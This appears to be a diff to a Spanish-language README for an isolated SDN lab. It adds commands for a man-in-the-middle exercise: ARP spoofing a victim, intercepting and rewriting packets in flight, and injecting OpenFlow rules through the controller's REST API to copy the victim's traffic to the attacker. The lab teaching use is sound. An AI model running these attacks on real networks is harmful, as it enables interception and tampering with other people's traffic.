@@ -143,7 +143,60 @@ ping -c 3 10.0.0.12
 sudo ovs-ofctl -O OpenFlow13 dump-flows br0
 ```
 Toma una **snapshot** en GNS3. Con esto la Fase 1 queda montada.
-(El detalle del ataque MITM — Fase 2 — está en [`docs/FASE2.md`](docs/FASE2.md).)
+
+---
+
+## Ejecución del ataque MITM (Fase 2)
+
+Con el laboratorio de la Fase 1 funcionando (Ryu + OVS + hosts con conectividad), el ataque se lanza
+desde el atacante **h3**. Detalle completo y checklist en [`docs/FASE2.md`](docs/FASE2.md).
+
+### Preparación extra en h3
+```bash
+# netfilterqueue se compila desde C: instala las cabeceras ANTES o pip falla
+sudo apt-get install -y build-essential python3-dev libnetfilter-queue-dev libnfnetlink-dev curl netcat
+pip3 install netfilterqueue requests
+sudo sysctl -w net.ipv4.ip_forward=1      # MITM transparente (no romper conectividad)
+```
+
+### Vector A — ARP Spoofing (en h3)
+```bash
+sudo python3 attack/arp_spoof.py --target 10.0.0.11 --gateway 10.0.0.12
+```
+Deja la terminal corriendo (reenvía ARP envenenado). Ctrl+C restaura las cachés.
+
+### Vector C — Interceptar / modificar (en h3, otra terminal)
+```bash
+# Solo observar el tráfico que pasa por el MITM
+sudo python3 attack/mitm_intercept.py --mode sniff --auto-iptables
+
+# Modificar payloads al vuelo (ej. censurar una palabra)
+sudo python3 attack/mitm_intercept.py --mode modify --find "Hola" --replace "XXXX" --auto-iptables
+```
+
+### Generar tráfico de prueba (en h1)
+```bash
+# en h2 antes:  python3 -m http.server 8000   y/o   nc -l -p 9000
+./attack/demo_traffic.sh 10.0.0.12
+```
+
+### Vector B — Inyección de flujos OpenFlow (complemento SDN)
+Requiere el controlador lanzado con la API REST (`REST=1 ./scripts/run_controller.sh`):
+```bash
+python3 attack/flow_inject.py --controller 192.168.100.10 list
+python3 attack/flow_inject.py --controller 192.168.100.10 dump --dpid 1
+# duplicar el tráfico de la víctima al puerto del atacante
+python3 attack/flow_inject.py --controller 192.168.100.10 inject \
+    --dpid 1 --src-ip 10.0.0.11 --normal-port 2 --attacker-port 3
+python3 attack/flow_inject.py --controller 192.168.100.10 clear --dpid 1   # limpieza
+```
+
+### Verificar el MITM (en h1)
+```bash
+./attack/verify_mitm.sh 10.0.0.12 <MAC_de_h3>      # debe decir "MITM CONFIRMADO"
+```
+
+> ⚠️ Solo en el laboratorio aislado del proyecto.
 
 ---
 
